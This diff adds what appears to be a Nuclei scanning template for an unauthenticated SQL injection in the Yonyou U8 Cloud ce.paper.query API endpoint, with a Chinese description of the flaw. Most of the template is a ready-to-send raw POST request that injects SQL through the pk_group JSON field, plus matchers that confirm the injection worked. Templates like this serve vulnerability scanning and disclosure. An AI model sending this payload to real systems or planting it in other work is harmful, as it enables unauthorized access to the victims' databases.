@@ -1,0 +1,44 @@
+id: yonyou-u8-cloud-query-sqli
+info:
+  name: 用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 在用友 U8 Cloud 系统的 /u8cloud/openapi/ce.paper.query 接口中发现一处严重的高危 SQL注入漏洞。该漏洞允许未经身份验证的远程攻击者通过构造恶意的 JSON 请求，在数据库中执行任意 SQL 命令。漏洞的根源在于服务端未对用户输入的 pk_group 和 pk_paper 参数进行任何过滤或预编译处理，直接将其拼接至 SQL 查询语句中
+  reference: 
+    - https://mp.weixin.qq.com/s/dYtLk7S4wz6fUMxFnQVVYQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,u8cloud
+
+http:
+  - raw:  
+      - |
+        POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+        Cache-Control: max-age=0
+        Content-Type: application/json
+        Content-Length: 95
+
+        {
+          "paperexecute": [
+            { "pk_group": "'-1/user--", "pk_paper": "1" }
+          ]
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'nvarchar')
+        condition: and
